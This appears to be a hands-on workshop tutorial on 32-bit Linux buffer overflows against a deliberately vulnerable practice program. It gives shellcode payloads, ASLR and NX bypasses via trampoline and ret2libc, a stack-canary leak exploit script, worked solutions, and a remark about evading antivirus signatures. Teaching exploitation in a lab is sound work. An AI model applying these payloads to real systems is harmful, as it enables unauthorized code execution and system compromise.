# Buffer Overflows 2025
## Parker Garrison

```
To get started
	Clone the visual demo
		git clone https://github.com/parkergarrison/visualoverflow
		
	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
		git clone https://github.com/parkergarrison/overflow
		cd overflow
	
	Download a cross-compiler for 32-bit binaries.
		sudo apt-get install gcc-multilib
	
	
	Download and install gef
		wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
		echo source ~/.gdbinit-gef.py >> ~/.gdbinit
		
		Formerly we used Python Exploit Development Assistance, but it is no longer updated.
		gdb-peda to execute some of the gdb commands such as checksec:
			git clone https://github.com/longld/peda.git ~/peda
			echo "source ~/peda/peda.py" >> ~/.gdbinit
	
	Download ROPgadget for one of the challenges:
		sudo apt install python3-capstone # assumes no venv
		git clone https://github.com/JonathanSalwan/ROPgadget.git

Memory and the Stack
	Ensure ASLR is off
		echo 0 >| /proc/sys/kernel/randomize_va_space
		
		Alternative: Turn off ASLR and run just one program:
			setarch $(uname -m) -R $(pwd)/filename.out # replace with actual full path to file
	
	Compile segment_mem.c
		gcc -m32 segment_mem.c -o segment_mem
	
	Run this binary to examine addresses which are in various memory segments:
		./segment_mem
			Address in .text: 0804848b

			Address of etext: 08048678
			Address in .data: 08048680
			Address in .data: 08049958

			Address of edata: 0804995c
			Address in .bss: 08049964

			Address of end: 08049968
			Address in heap: 0804a008

			...

			Address in stack: bfb76968
			Address in stack: bfb7696e
	
	Examining the impact of ASLR
		Run it again
			Which addresses changed?
			
		Turn on ASLR and try again
			echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
			Or as root -- echo 1 >| /proc/sys/kernel/randomize_va_space # note the space after '1'!
		
		Turn off ASLR and try again
			echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
	
		
Exploit Mitigations and Bypasses
	Exercise 0: No Mitigations
		Compile wisdom-basic.c without NX
			gcc -m32 wisdom-basic.c -g -fno-stack-protector -z execstack -o wisdom_e0.out -std=c99
			# Old standard allows extremely vulnerable "gets" function to be used
		
		Turn off ASLR
			echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
		
		Run the program
			./wisdom_e0.out
		
		Debug the program
			gdb -p $(pgrep wisdom_e0) # only works if there is exactly 1 instance running
		
		Generate a cyclic pattern of length 300
			chmod +x ./pat_gen.py
			./pat_gen.py 300
		
		Compute the offset of the start of the pattern to saved value of EIP
			chmod +x ./pat_ind.py
			python ./pat_ind.py [hexdigits]
		
		Display functions in the program
			(gdb) info functions
		
		Print the address of shell function
			(gdb) print shell
		
		Print escaped attack code to call shell function
			#0x56556271
			python2 -c 'print "A"*152 + r"\x71\x62\x55\x56"'
			# Should do this with struct.pack when running without runescape.sh, to avoid typos

		Execute program while escaping input
			chmod +x runescape.sh
			./runescape.sh ./wisdom_e0.out
		
		Ensure that pgrep will find the correct process
			ps -ef | grep wisdom
			
		Attach to gdb
			gdb -p $(pgrep wisdom)
		
		Detach from gdb
			(gdb) detach
	
	Exercise 1: No mitigations, no shell function
		There are a few differences from above.
		
		Compile wisdom.c without NX
			gcc wisdom.c -g -fno-stack-protector -z execstack -o wisdom_e1.out
		
		Generate a pattern to use as input and compute the offset to saved EIP
			./pat_gen.py 300
			python ./pat_ind.py [hexdigits]
		
		
		
		Look on the stack to see where the A's start
			
			gef> x/150x $ebp
			
			gef> search-pattern AAAA
		
		/bin/sh Shellcode from exploit-db in escaped format
			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
		
		After seeing where the A's start and end, write the exploit within that constraint
			python2 -c 'print r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*(152 - 23) + r"\xe0\xca\xff\xff"'

			
			cat flag # It worked!
			
			Problem 1: Rewrite this payload, assuming that the first 152 bytes gets clobbered later in the function (you can test this by putting 152 bytes of B's in "Enter some wisdom"), but you have sufficient space to load up your payload (300 characters of input).
				To start, find the location of esp in the function that _calls_ the vulnerable function - not in the function itself.
					Remember that "mov esp, ebp" occurs right before sending control to our code. ebp is the extent of the previous function's stack. We can choose to use that also.
						*Caveat -- Some compilers use the ebp register as a general purpose register instead. We won't encounter that today.
					
					gdb-peda$ info registers esp
					(shortcut: i r esp)
					0xffffcad0
				
				
		
			
	Exercise 2: Bypass ASLR, no NX with Trampoline
		Compile wisdom_e2.c without NX
			gcc wisdom_e2.c -g -fno-stack-protector -z execstack -o wisdom_e2.out
			
			(Why is there a slightly different source file? None of the trampolines exist in the compiled version of the original file.)
		
		Find useful ESP gadgets
			You can use https://defuse.ca/online-x86-assembler.htm#disassembly
			Enter "jmp esp"
			
			This instruction should _never_ appear in memory!
			
			Search for the instruction appearing in only the most common and direct way (other indirect ways are possible)
			
			gef> search-pattern 0xffe4 big
			
			gdb-peda$ jmpcall -r esp
			gdb-peda$ jmpcall
			
			Later we will use ropgadget, for features not in gef.
			
			
			Pick an address:
				Ensure the address is executable.
				
				Ensure that it is not subject to address randomization.
				
				If not, go back and pick another gadget.
			
			You have a lot to pick from - can help defeat AV signatures!
		
		Now we get to turn on and bypass a mitigation! Turn on ASLR.
		
		/bin/sh Shellcode from exploit-db in escaped format
			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
			
		Print escaped ASLR bypass exploit code
			Python file: 
				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
				nops = r"\x90" * 16
				addr =  r"\xcc\x62\x55\x56" # This address is a "trampoline" and contains a jmp esp
				
				print "A"*152 + addr + nops + sc
				
				Success!
				
	
	Exercise 3: Bypass NX with ret2libc
		
		Find address of "/bin/bash" string compiled into program
			Automatic using tool
				git clone https://github.com/JonathanSalwan/ROPgadget.git
				python ./ROPgadget/ROPgadget.py --binary ~/binexp/wisdom.out --string "/bin/bash"
					Strings information
					============================================================
					0x08048a20 : /bin/bash
		
			Alternative (didn't you see it somewhere already?)
				gdb> print wisdoms[1]
					$1 = 0x8048a08 "A great shell to use is /bin/bash"
				gdb> print wisdoms[1]+24
					$2 = 0x8048a20 "/bin/bash"
			
		Examine memory location as a string
			gdb-peda$ x/s 0x8048a20
				0x8048a20:	 "/bin/bash"
			
		
		Find addresses of functions
			All functions matching regular expression "system@plt":

			Non-debugging symbols:
			0x08048570  system@plt

			gdb-peda$ p system
				$1 = {<text variable, no debug info>} 0xb7e503e0 <system>
			gdb-peda$ p exit
				$2 = {<text variable, no debug info>} 0xb7e431b0 <exit>
				
		Recompile wisdom.c with NX and no stack canaries
			gcc wisdom.c -g -fno-stack-protector -o wisdom_e3.out
			chmod +x runescape.sh
			./runescape.sh wisdom.out-nx
		
		Understand Calling Conventions
		
		Print escaped NX bypass exploit code (file: exploit_e3_plt.py)
			Python file:
				#!/usr/bin/python2

				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
				nops = r"\x90" * 16

				addr_system = r"\x20\x92\xdb\xf7"
				addr_exit = r"\xd0\x5a\xda\xf7"

				system_args = r"\x68\x70\x55\x56" #0x56557068

				print "A"*152 + addr_system + addr_exit + system_args
			
			Success!
			
			This should be the first time that our exploit didn't result in a crash.
				What does gdb say this time for the exit status?
				[Inferior 1 (process #####) exited normally]
				
		
		Problem 2: Rewrite the exploit to use a string "/bin/sh" that you insert on the stack manually, with the "Add wisdom" feature.
			a. For the first challenge in this series, turn ASLR off.
			b. Turn ASLR on and use a pointer leak (as described below in Exercise 4).
		
		Problem 3: Turn ASLR on. Search for the trampoline to the desired function in the GOT (Global Offset Table) and use it.
	
	Exercise 4: Stack Canaries, with NX and ASLR
		Recompile wisdom.c with Stack Canaries
			gcc -m32 wisdom.c -g -fstack-protector -o wisdom_e4.out -z execstack -std=c99
			# Note - if we use the "shell" function to check our exploit first, we need -z execstack for that function to work
		
		Print program input which will leak a canary when interpreted as a format string but is not too long for the buffer
			python2 -c 'print "%x " * 40'
		
		Find the value that changes between runs
			%11$x
		
		Python code to print escaped Stack Canary exploit code
			#!/usr/bin/python2
			import sys

			# Exploit Linux randomized null terminator canaries with 2 buffers

			def lp(s, n):
				return "0"*(n-len(s))+s

			def reverse_and_escape(hexstring):
				return "".join([r"\x"+hexstring[2*i:2*i+2] for i in range(int(len(hexstring)/2))][::-1])


			''' Exploit parameters '''
			canary_hex_little = sys.argv[1]
			eip_offset_1 = 34*4
			eip_offset_2 = 34*4
			eip_hex_str = "56556281"


			eip_escaped = reverse_and_escape(eip_hex_str.zfill(8))
			canary_offset_1 = eip_offset_1 - 8
			print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # 'B' instead of the first null byte

			print 
			canary_offset_2 = eip_offset_2 - 8
			print "A"*canary_offset_2 # implicit "\x00" will be written
		
		Run the file:
			python exploit_e4_canaryleak.py [canaryhex]

Solutions

	Solution to Problem 1
		First attempt:
		python2 -c 'print "A"*152 + r"\xd0\xca\xff\xff" + r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'
		
		We missed but see that the stack (esp) is indeed pointing to the right place, just the instruction (eip) was not.
		
		python2 -c 'print "A"*152 + r"\x80\xcb\xff\xff" + r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'
		
```

